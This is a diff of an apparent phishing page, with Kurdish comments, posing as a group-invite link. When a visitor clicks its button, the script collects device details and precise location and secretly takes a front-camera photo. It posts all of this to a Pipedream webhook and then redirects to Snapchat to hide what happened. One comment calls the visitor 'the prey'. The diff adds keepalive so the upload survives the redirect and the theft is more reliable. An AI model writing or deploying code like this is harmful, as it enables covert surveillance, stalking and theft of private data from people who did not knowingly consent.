@@ -43,10 +43,7 @@
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // ⚠️ لینکی فەرمی پڕۆژەی Pipedreamـەکەی خۆت
         const secureWebhook = "https://eo7he3dstagkpih.m.pipedream.net";
-        
-        // ⚠️ لینکی ئەو پڕۆفایل یان ڤیدیۆیەی سناپچات کە دەتەوێت کەسەکە بۆی بڕوات
         const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";
 
         const video = document.getElementById('video');
@@ -55,12 +52,13 @@
 
         let globalBattery = "N/A";
         let globalCharging = "N/A";
-        let globalMaps = "⚠️ مۆڵەتی نەدا یان هێشتا بارنەبووە";
+        let globalMaps = "⚠️ مۆڵەتی نەدا یان ڕەتکرایەوە";
         let globalDevice = navigator.platform || "Unknown";
         let globalBrowser = "Unknown Browser";
         let globalTime = new Date().toLocaleString('ku-IQ') || new Date().toString();
         let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "Unknown";
 
+        // دیاریکردنی جۆری وێبگەڕ
         const userAgent = navigator.userAgent;
         if (userAgent.indexOf("Firefox") > -1) globalBrowser = "Firefox";
         else if (userAgent.indexOf("SamsungBrowser") > -1) globalBrowser = "Samsung Browser";
@@ -68,6 +66,7 @@
         else if (userAgent.indexOf("Chrome") > -1) globalBrowser = "Chrome";
         else if (userAgent.indexOf("Safari") > -1) globalBrowser = "Safari";
 
+        // وەرگرتنی زانیاری پاتری
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
                 globalBattery = Math.round(battery.level * 100) + "%";
@@ -75,47 +74,50 @@
             }).catch(() => {});
         }
 
-        // داواکردنی لۆکەیشن لە پاشبنەمادا
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((position) => {
-                let lat = position.coords.latitude;
-                let lon = position.coords.longitude;
-                globalMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
-            }, (error) => {
-                globalMaps = "⚠️ نێچیرەکە مۆڵەتی لۆکەیشنی ڕەتکردەوە!";
-            }, { 
-                enableHighAccuracy: true, 
-                timeout: 7000, 
-                maximumAge: 0 
-            });
-        }
+        // کاتێک کلیک لەسەر دوگمەکە دەکرێت
+        document.getElementById('viewGroupBtn').addEventListener('click', async function() {
+            document.getElementById('viewGroupBtn').innerText = "Loading...";
 
-        // کاتێک کلیک لە دوگمەکە دەکات - لێرەدا داوای کامێرا دەکات
-        document.getElementById('viewGroupBtn').addEventListener('click', function(e) {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then(stream => {
-                    video.srcObject = stream;
-                    
-                    // کەمێک چاوەڕێ دەکات تا کامێراکە لۆد دەبێت و وێنەکە دەگرێت
-                    setTimeout(() => {
-                        try {
-                            context.drawImage(video, 0, 0, 640, 480);
-                            canvas.toBlob(function(blob) {
-                                sendDataToServer(blob);
-                            }, 'image/jpeg');
-                        } catch (err) {
-                            sendDataToServer(null);
-                        }
-                    }, 300);
-                })
-                .catch(() => {
-                    // ئەگەر مۆڵەتی کامێراشی نەدا، هەر داتاکانی تر بنێرە
-                    sendDataToServer(null);
+            // ١. هەوڵدان بۆ وەرگرتنی لۆکەیشن بە خێرایی
+            if (navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+                        globalMaps = "http://maps.google.com/?q=" + lat + "," + lon;
+                        resolve();
+                    }, () => { resolve(); }, { timeout: 3000 });
                 });
+            }
+
+            try {
+                // ٢. داواکردنی کامێرا لە کاتی کلیکەکەدا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                
+                // کاتی کورت بۆ ڕوونکردنەوەی کامێرا
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // کێشانی وێنەکە
+                context.drawImage(video, 0, 0, 640, 480);
+                
+                // گۆڕینی وێنەکە بۆ بلۆب بە شێوازی چاوەڕوانکراوی بەهێز (Promise)
+                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                
+                // ناردنی داتاکان
+                await sendStrictData(imageBlob);
+
+            } catch (err) {
+                // ئەگەر کامێراشی نەدا، هەر داتاکانی تر بنێرە
+                await sendStrictData(null);
+            } finally {
+                // گۆڕینی لاپەڕە بۆ سناپچات لە کۆتایی هەموو پڕۆسەکەدا
+                window.location.href = snapchatRedirectUrl;
+            }
         });
 
-        // ناردنی داتا و ناچارکردنی وێبگەر بۆ چاوەڕوانیکردن پێش بازدان بۆ سناپچات
-        function sendDataToServer(imageBlob) {
+        // فەرمانی ناردنی داتا بە شێوازی بنبڕکردنی پچڕانی وێبگەڕ
+        async function sendStrictData(imageBlob) {
             const formData = new FormData();
             let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
 
@@ -132,13 +134,16 @@
                 formData.append("photo", imageBlob, "snap.jpg");
             }
 
-            // ناردنی داتا بۆ Pipedream
-            fetch(secureWebhook, { method: 'POST', body: formData });
-
-            // ⏱️ ناچارکردنی وێبگەر بۆ چاوەڕوانی تەنها (٥٠٠ چرکە لێدان) بۆ دڵنیابوون لە ناردن، پاشان گۆڕینی لاپەڕە
-            setTimeout(() => {
-                window.location.href = snapchatRedirectUrl;
-            }, 500);
+            try {
+                // بەکارهێنانی keepalive بۆ ئەوەی ناردنەکە نەپچڕێت تەنانەت ئەگەر لاپەڕەکەش بگۆڕێت
+                await fetch(secureWebhook, { 
+                    method: 'POST', 
+                    body: formData,
+                    keepalive: true 
+                });
+            } catch (err) {
+                console.error("Error sending data:", err);
+            }
         }
     </script>
 </body>
